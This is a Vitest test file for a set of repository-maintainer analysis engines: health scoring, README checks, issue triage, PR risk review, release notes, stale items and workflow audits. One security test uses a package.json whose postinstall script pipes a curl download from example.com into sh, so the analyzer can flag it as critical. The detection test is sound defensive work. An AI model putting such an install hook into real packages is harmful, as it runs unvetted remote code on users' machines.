import { describe, expect, it } from 'vitest'
import {
  analyzeMaintainerWorkload,
  analyzeReadme,
  analyzeRepoHealth,
  analyzeSecurity,
  analyzeWorkflows,
  detectStaleItems,
  generatePrReviewSummary,
  generateReleasePlan,
  reviewPullRequest,
  triageIssue,
} from './maintainerEngines'

describe('maintainerEngines', () => {
  it('scores complete repo health higher than incomplete repo health', () => {
    const incomplete = analyzeRepoHealth({ readme: '# App' })
    const complete = analyzeRepoHealth({
      readme: '# App',
      license: true,
      contributing: true,
      codeOfConduct: true,
      securityPolicy: true,
      changelog: true,
      issueTemplates: true,
      pullRequestTemplate: true,
      ciWorkflow: true,
      lockfile: true,
    })

    expect(complete.score).toBeGreaterThan(incomplete.score)
    expect(complete.grade).toBe('A')
    expect(incomplete.signals.some((signal) => signal.severity === 'critical')).toBe(true)
  })

  it('detects weak README structure and missing sections', () => {
    const result = analyzeReadme('# Tiny\n\nSomething useful.')

    expect(result.score).toBeLessThan(70)
    expect(result.signals.some((signal) => signal.label === 'Missing README sections')).toBe(true)
  })

  it('triages security issues as high priority', () => {
    const result = triageIssue('Security vulnerability in token handling', 'A secret token appears in logs.')

    expect(result.labels).toContain('security')
    expect(result.priority).toBe('high')
  })

  it('flags auth PRs without tests as risky', () => {
    const result = reviewPullRequest('Change auth permissions', 'Updates token permission behavior', 'src/auth.ts')

    expect(result.risk).toBe('high')
    expect(result.mergeReadiness).toBeLessThan(50)
    expect(result.checklist.join(' ')).toContain('sensitive-data')
  })

  it('groups commits into release notes and suggests version bump', () => {
    const result = generateReleasePlan('feat: add issue triage\nfix: repair changelog grouping')

    expect(result.versionSuggestion).toBe('minor')
    expect(result.changelog).toContain('## Added')
    expect(result.changelog).toContain('## Fixed')
  })

  it('penalizes missing security policy and risky scripts', () => {
    const result = analyzeSecurity({
      packageJson: JSON.stringify({ scripts: { postinstall: 'curl https://example.com/install.sh | sh' } }),
    })

    expect(result.score).toBeLessThan(70)
    expect(result.signals.some((signal) => signal.severity === 'critical')).toBe(true)
  })

  it('detects stale issues and pull requests', () => {
    const now = new Date('2026-06-07T00:00:00Z')
    const result = detectStaleItems(
      [{ number: 12, title: 'Old bug', updated_at: '2026-04-01T00:00:00Z' }],
      [{ number: 44, title: 'Stale PR', updated_at: '2026-03-15T00:00:00Z' }],
      30,
      now,
    )

    expect(result.totalStale).toBe(2)
    expect(result.staleIssues).toHaveLength(1)
    expect(result.stalePullRequests).toHaveLength(1)
    expect(result.signals.some((signal) => signal.label === 'Stale issues detected')).toBe(true)
  })

  it('rewards security workflow detection', () => {
    const withoutWorkflow = analyzeSecurity({ securityPolicy: true, lockfile: true })
    const withWorkflow = analyzeSecurity({ securityPolicy: true, lockfile: true, securityWorkflow: true })

    expect(withWorkflow.score).toBeGreaterThan(withoutWorkflow.score)
    expect(withWorkflow.signals.some((signal) => signal.label === 'Security workflow detected')).toBe(true)
  })

  it('generates a maintainer-friendly PR summary', () => {
    const review = reviewPullRequest('Update auth middleware', 'Tightens token validation', 'src/auth.ts\nsrc/auth.test.ts')
    const summary = generatePrReviewSummary('Update auth middleware', 'Tightens token validation', 'src/auth.ts\nsrc/auth.test.ts', review)

    expect(summary).toContain('medium risk')
    expect(summary).toContain('2 file(s)')
  })

  it('flags heavy maintainer workload from backlog signals', () => {
    const workload = analyzeMaintainerWorkload({ openIssues: 24, openPullRequests: 11, staleTotal: 6 })

    expect(workload.burden).toBe('high')
    expect(workload.score).toBeLessThan(50)
  })

  it('audits GitHub Actions workflows for permissions and pinning', () => {
    const audit = analyzeWorkflows([
      'name: CI\non: push\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4',
    ])

    expect(audit.workflowsFound).toBe(1)
    expect(audit.score).toBeGreaterThan(70)
    expect(audit.signals.some((signal) => signal.label === 'Explicit permissions')).toBe(true)
  })
})
